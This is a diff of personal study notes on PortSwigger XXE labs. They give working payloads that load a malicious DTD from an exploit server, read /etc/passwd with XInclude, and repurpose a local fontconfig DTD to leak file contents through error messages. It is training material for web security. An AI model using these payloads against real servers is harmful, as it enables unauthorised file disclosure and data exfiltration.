@@ -222,14 +222,9 @@ The lab contains a link to an exploit server on a different domain where you can
 1. Click "View exploit" and take a note of the URL for your malicious DTD.
 2. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 3. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
-
     `<!DOCTYPE test [<!ENTITY % loadDTD SYSTEM "YOUR-DTD-URL"> %loadDTD;]>`
-    
-    You should see an error message containing the contents of the `/etc/passwd` file.
-
 
 Analysis:
-
 - out of band XXE using a DTD exploit file 
     `<!DOCTYPE test [<!ENTITY % loadDtd SYSTEM "YOUR-DTD-URL(server/exploit)"> %loadDtd;]>`
 
@@ -250,13 +245,10 @@ Analysis:
 
 ## **7.  Exploiting XInclude to retrieve files**
 This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed(partially parsed).
-Because you don't control the entire XML document you can't define a DTD to launch a classic [XXE](https://portswigger.net/web-security/xxe) attack.
-
-To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.
+Because you don't control the entire XML document you can't define a DTD to launch a classic [XXE](https://portswigger.net/web-security/xxe) attack. To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.
 
 1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 2. Set the value of the `productId` parameter to:
-    
     `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
 
 Analysis:
@@ -272,7 +264,7 @@ Analysis:
 	- entering an entity that does not exists(encode the `&`)  to analyse the error recieved
 	![[Pasted image 20240929091055.png]]
 
-- XInclude is useful when we do not have control over the entire document.
+- XInclude is useful when **we do not have control over the entire document.**
 	- refer the XInclude name space first / refer the file that we want to retrieve
 ```
 <foo
@@ -331,3 +323,39 @@ You'll need to reference an existing DTD file on the server and redefine an enti
     ```
     
     This will import the Yelp DTD, then redefine the `ISOamso` entity, triggering an error message containing the contents of the `/etc/passwd` file.
+
+Analysis:
+- we will use a normal out of band xxe injection to observe the error recieved
+	![[Pasted image 20240930193712.png]]
+
+- afterwards we will inject an inexistent entity for the same reasons
+	![[Pasted image 20240930193726.png]]
+
+- using a dtd enumeration list(https://github.com/GoSecure/dtd-finder/blob/master/list/dtd_files.txt) we will use Burp intruder to inject:
+	![[Pasted image 20240930193909.png]]
+
+- we have discovered following path: `/usr/share/xml/fontconfig/fonts.dtd`
+	![[Pasted image 20240930194015.png]]
+
+- Payload:
+	  ![[Pasted image 20240930194309.png]]
+
+```markup
+<!DOCTYPE message [
+    <!ENTITY % nbyte SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
+
+    <!ENTITY % expr 'aaa)>
+        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa (bb'>
+
+    %nbyte;
+]>
+<message></message>
+```
+
+- now, the contents of the desired file will be displayed via the error message displayed
+	![[Pasted image 20240930194637.png]]
+	
